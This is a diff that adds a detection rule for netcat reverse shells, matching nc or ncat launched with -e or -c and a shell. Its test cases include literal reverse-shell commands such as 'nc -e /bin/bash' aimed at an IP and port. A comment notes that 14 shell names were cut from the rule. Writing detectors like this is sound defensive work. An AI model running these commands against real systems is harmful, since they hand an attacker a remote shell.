@@ -1,0 +1,21 @@
+name: sigma_netcat_reverse_shell
+mode: alert
+overlap_allowed_with: [suspicious_process, sigma_susp_network_utilities_execution]
+eval: |
+  (
+    ((e.process_name == "nc" || e.process_name == "ncat")) && ((e.process_args.contains(" -c ") || e.process_args.contains(" -e "))) && ((e.process_args.contains(" ash") || e.process_args.contains(" bash") || e.process_args.contains(" bsh") || e.process_args.contains(" csh") || e.process_args.contains(" ksh") || e.process_args.contains(" pdksh") || e.process_args.contains(" sh") || e.process_args.contains(" tcsh") || e.process_args.contains("/bin/ash") || e.process_args.contains("/bin/bash") || e.process_args.contains("/bin/bsh") || e.process_args.contains("/bin/csh") /* truncated: 14 more value(s) omitted to stay within Rhai complexity limit */))
+  )
+
+tests:
+  - cleartext: "nc with -e and /bin/bash"
+    process_name: nc
+    process_args: "nc -e /bin/bash 10.10.10.10 4444"
+    should_match: true
+  - cleartext: "ncat with -c and bash"
+    process_name: ncat
+    process_args: "ncat -c bash 192.168.1.1 8080"
+    should_match: true
+  - cleartext: "normal nc"
+    process_name: nc
+    process_args: "nc -l -p 8080"
+    should_match: false
